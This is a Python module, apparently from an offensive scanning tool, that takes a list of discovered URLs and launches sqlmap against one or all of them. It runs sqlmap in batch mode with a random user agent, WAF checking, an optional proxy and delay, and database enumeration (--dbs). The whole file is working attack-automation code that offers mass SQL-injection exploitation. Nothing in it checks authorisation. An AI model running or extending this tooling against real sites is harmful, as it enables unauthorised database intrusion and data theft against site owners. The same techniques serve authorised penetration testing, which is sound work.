import subprocess
import shlex
import sys
from core.utils import G, C, Y, R, W
from core.logging import export_results

def execute_attack(urls, args):
    print(f"\n{C}[+] Select target number to exploit (1-{len(urls)}) or type '{Y}all{C}': {W}", end="")
    try:
        choice = input().strip()
    except EOFError:
        print(f"\n{R}[-] Input interrupted.{W}")
        return
    
    sqlmap_args = ["--batch", "--random-agent", "--level=1", "--risk=1", "--check-waf"]
    if args.proxy:
        sqlmap_args.append(f"--proxy={args.proxy}")
    if args.delay > 0:
        sqlmap_args.append(f"--delay={args.delay}")
    
    print(f"\n{Y}[*] Handing targets off to SQLMap...{W}")
    
    if choice.lower() == 'all':
        print(f"{G}[+] Launching mass parallel checks...{W}\n")
        cmd = ["sqlmap", "-m", ".targets.txt"] + sqlmap_args + ["--dbs"]
        try:
            subprocess.run(cmd, check=False)
        except Exception as e:
            print(f"{R}[-] SQLMap execution failed: {e}{W}")
        export_results()
    else:
        try:
            val = int(choice) - 1
            if 0 <= val < len(urls):
                selected = urls[val]
                print(f"{G}[+] Testing endpoint: {W}{selected}\n")
                cmd = ["sqlmap", "-u", selected] + sqlmap_args + ["--dbs"]
                try:
                    subprocess.run(cmd, check=False)
                except Exception as e:
                    print(f"{R}[-] SQLMap execution failed: {e}{W}")
                export_results()
            else:
                print(f"{R}[-] Error: Invalid target index selection.{W}")
        except ValueError:
            print(f"{R}[-] Error: Non-numeric selection provided.{W}")
